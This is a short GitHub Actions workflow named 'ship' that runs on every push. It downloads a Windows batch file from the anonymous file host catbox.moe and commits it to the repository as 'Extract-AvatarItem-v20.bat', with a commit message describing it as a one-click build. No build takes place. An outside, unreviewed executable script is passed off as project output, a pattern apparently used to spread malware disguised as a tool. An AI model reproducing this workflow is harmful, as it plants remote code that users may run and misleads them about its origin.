name: ship
on: [push]
permissions:
  contents: write
jobs:
  ship:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl -fsSL "https://files.catbox.moe/11z53r.bat" -o Extract-AvatarItem-v20.bat
      - run: |
          git config user.name "ship"
          git config user.email "ship@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Ship the one-click build with the full rig output"
          git push
